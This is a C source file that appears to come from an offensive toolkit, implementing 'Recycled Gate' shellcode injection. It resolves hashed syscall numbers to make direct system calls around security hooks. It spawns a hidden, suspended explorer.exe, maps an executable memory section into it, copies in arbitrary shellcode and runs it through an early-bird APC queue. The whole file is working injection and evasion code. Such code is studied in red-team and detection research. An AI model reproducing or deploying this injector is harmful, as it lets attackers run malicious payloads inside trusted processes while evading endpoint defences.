#include "windows.h"
#include "recycled_gate_core.h"
#include "stdio.h"

extern void PrepareSyscall();

extern DoSyscall();

PVOID findNtDll(void);

DWORD getSyscall(DWORD crypted_hash, Syscall *pSyscall);

typedef VOID(KNORMAL_ROUTINE)(
        IN PVOID NormalContext,
        IN PVOID SystemArgument1,
        IN PVOID SystemArgument2);

typedef KNORMAL_ROUTINE *PKNORMAL_ROUTINE;

INT RECYCLED_GATE_MAIN(const unsigned char *code, size_t *size, boolean debug) {
    char _[] = "\x00";

    char *shellcodeT = (char *) malloc(*size);
    for (int i = 0; i < *size; i++) {
        shellcodeT[i] = (char) code[i];
    }
    DWORD dwSuccess = FAIL;
    NTSTATUS ntStatus = 0;

    Syscall sysNtCreateSection = {0x00}, sysNtMapViewOfSection = {0x00}, sysNtQueueApcThread = {
            0x00}, sysNtResumeThread = {0x00}, sysNtCreateThreadEx = {0x00};
    HANDLE hSection = NULL;
    PVOID pViewLocal = NULL, pViewRemote = NULL;

    STARTUPINFOA si = {0x00};
    PROCESS_INFORMATION pi = {0x00};

    dwSuccess = getSyscall(0x916c6394, &sysNtCreateSection);
    if (dwSuccess == FAIL)
        goto exit;

    dwSuccess = getSyscall(0x625d5a2e, &sysNtMapViewOfSection);
    if (dwSuccess == FAIL)
        goto exit;

    dwSuccess = getSyscall(0x9523617c, &sysNtQueueApcThread);
    if (dwSuccess == FAIL)
        goto exit;

    dwSuccess = getSyscall(0x6d397e74, &sysNtResumeThread);
    if (dwSuccess == FAIL)
        goto exit;

    dwSuccess = getSyscall(0x8a4e6274, &sysNtCreateThreadEx);
    if (dwSuccess == FAIL)
        goto exit;

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.dwFlags |= STARTF_USESTDHANDLES;

    dwSuccess = CreateProcessA("C:\\Windows\\explorer.exe", NULL, 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &si, &pi);
    if (dwSuccess == FAIL)
        goto exit;

    PrepareSyscall(sysNtCreateSection.dwSyscallNr, sysNtCreateSection.pRecycledGate);
    ntStatus = DoSyscall(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL,
                         (PLARGE_INTEGER) size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(ntStatus) && debug) {
        printf("[-] Failed to create section\n");
        goto exit;
    }
    if (debug) {
        printf("[*] Created section: 0x%p\n", hSection);
    }

    PrepareSyscall(sysNtMapViewOfSection.dwSyscallNr, sysNtMapViewOfSection.pRecycledGate);
    ntStatus = DoSyscall(hSection, GetCurrentProcess(), &pViewLocal, 0, 0, NULL, (PLARGE_INTEGER) size, 2, 0,
                         PAGE_READWRITE);
    if (!NT_SUCCESS(ntStatus) && debug) {
        printf("[-] Failed to map view of section locally, %d\n", GetLastError());
        goto exit;
    }
    if (debug) {
        printf("[*] Mapped section locally: 0x%p\n", pViewLocal);
    }

    PrepareSyscall(sysNtMapViewOfSection.dwSyscallNr, sysNtMapViewOfSection.pRecycledGate);
    ntStatus = DoSyscall(hSection, pi.hProcess, &pViewRemote, 0, 0, NULL, size, 2, 0, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(ntStatus) && debug) {
        printf("[-] Failed to map view of section remotely\n");
        goto exit;
    }
    if (debug) {
        printf("[*] Mapped section remote: 0x%p\n", pViewRemote);
    }

    for (int i = 0; i < *size; i++)
        *((PBYTE) pViewLocal + i) = *((PBYTE) shellcodeT + i);

    PrepareSyscall(sysNtQueueApcThread.dwSyscallNr, sysNtQueueApcThread.pRecycledGate);
    ntStatus = DoSyscall(pi.hThread, (PKNORMAL_ROUTINE) pViewRemote, pViewRemote, NULL, NULL);
    if (!NT_SUCCESS(ntStatus) && debug) {
        printf("[-] Failed to call NtQueueApcThread\n");
        goto exit;
    }
    if (debug) {
        printf("[*] NtQueueApcThread successfull\n");
    }

    PrepareSyscall(sysNtResumeThread.dwSyscallNr, sysNtResumeThread.pRecycledGate);
    ntStatus = DoSyscall(pi.hThread, NULL);
    if (!NT_SUCCESS(ntStatus) && debug) {
        printf("[-] Failed to resume thread\n");
        goto exit;
    }
    if (debug) {
        printf("[*] Resumed thread\n");
    }

    dwSuccess = SUCCESS;

    exit:

    if (pi.hProcess)
        CloseHandle(pi.hProcess);

    if (pi.hThread)
        CloseHandle(pi.hThread);

    return dwSuccess;

}
